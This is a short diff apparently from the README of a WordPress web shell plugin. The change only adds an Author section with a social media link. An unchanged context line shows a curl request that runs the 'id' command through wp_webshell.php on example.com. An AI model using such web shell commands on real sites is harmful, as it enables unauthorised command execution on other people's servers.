@@ -9,3 +9,7 @@
 curl http://example.com/wp-content/plugins/wp_webshell/wp_webshell.php?cmd=id
 ```
 <img width="838" height="72" alt="IMG" src="https://github.com/user-attachments/assets/4fd9260b-b448-441c-938a-e5c6248dc9b2" />
+
+## Author
+
+- [@XK3NF4](https://x.com/XK3NF4)
